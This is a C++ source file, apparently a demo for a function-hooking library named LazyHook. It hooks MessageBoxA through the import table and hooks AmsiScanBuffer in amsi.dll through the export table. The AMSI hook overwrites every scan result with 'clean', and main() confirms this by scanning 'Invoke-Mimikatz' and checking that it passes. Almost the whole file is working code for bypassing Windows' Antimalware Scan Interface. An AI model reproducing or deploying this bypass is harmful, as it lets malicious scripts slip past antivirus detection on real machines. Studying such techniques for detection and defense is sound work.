#include <Windows.h>
#include <cstdio>
#include <iostream>
#include <amsi.h>
#include "Internal/LazyHook/LazyHook.hpp"
#pragma comment(lib, "amsi.lib")
typedef int (WINAPI* TypeMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
typedef HANDLE(WINAPI* TypeCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HRESULT(WINAPI* TypeAmsiScanBuffer)(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, HAMSISESSION, AMSI_RESULT*);

TypeMessageBoxA OriginalMessageBoxA = nullptr;
TypeCreateFileA OriginalCreateFileA = nullptr;
TypeAmsiScanBuffer OriginalAmsiScanBuffer = nullptr;

int WINAPI HookMessageBoxA(HWND H, LPCSTR T, LPCSTR C, UINT U)
{
    printf("[*] MessageBoxA hooked!\n");
    return LazyHook::CallOriginal<int>(LazyHook::GetIatState(), H, "Hooked!", ">:)", U);
}

HANDLE WINAPI HookCreateFileA(LPCSTR Filename, DWORD Access, DWORD Share, LPSECURITY_ATTRIBUTES Sec, DWORD Creation, DWORD Flags, HANDLE Template)
{
    printf("[*] CreateFileA hooked: %s\n", Filename);
    return LazyHook::CallOriginal<HANDLE>(LazyHook::GetEatState(), Filename, Access, Share, Sec, Creation, Flags, Template);
}

HRESULT WINAPI HookAmsiScanBuffer(HAMSICONTEXT AmsiContext, PVOID Buffer, ULONG Length, LPCWSTR ContentName, HAMSISESSION AmsiSession, AMSI_RESULT* Result)
{
    printf("[*] AmsiScanBuffer hooked! Bypassing...\n");
    HRESULT OrgResult = LazyHook::CallOriginal<HRESULT>(LazyHook::GetEatState(), AmsiContext, Buffer, Length, ContentName, AmsiSession, Result);
    (*Result) = AMSI_RESULT_CLEAN;
    return OrgResult;
}

int main()
{
    printf("[*] Installing MessageBoxA IAT hook...\n");
    if (LazyHook::HookIAT("user32.dll", "MessageBoxA", HookMessageBoxA, (PVOID*)&OriginalMessageBoxA))
        printf("[+] MessageBoxA hooked!\n");

    printf("\n[*] Testing MessageBoxA...\n");
    MessageBoxA(NULL, "Test", "Test", 0);

    printf("\n[*] Loading amsi.dll...\n");
    LoadLibraryA("amsi.dll");

    printf("[*] Installing AmsiScanBuffer EAT hook...\n");
    if (LazyHook::HookEAT("amsi.dll", "AmsiScanBuffer", HookAmsiScanBuffer, (PVOID*)&OriginalAmsiScanBuffer))
        printf("[+] AmsiScanBuffer hooked!\n");
    else
        printf("[-] AmsiScanBuffer hook failed!\n");

    printf("\n[*] Testing AMSI bypass...\n");
    HAMSICONTEXT AmsiContext = nullptr;
    AmsiInitialize(L"TestApp", &AmsiContext);

    const char* MaliciousString = "Invoke-Mimikatz";
    AMSI_RESULT ScanResult = AMSI_RESULT_CLEAN;

    AmsiScanBuffer(AmsiContext, (PVOID)MaliciousString, (ULONG)strlen(MaliciousString), L"Test", NULL, &ScanResult);

    printf("[*] AMSI Result: %d (0=Clean, should be clean if bypass works)\n", ScanResult);

    AmsiUninitialize(AmsiContext);

    printf("\n[*] Press any key to unhook...\n");
    getchar();

    if (LazyHook::UnhookIAT())
        printf("[+] IAT hook removed!\n");

    if (LazyHook::UnhookEAT())
        printf("[+] EAT hook removed!\n");

    return 0;
}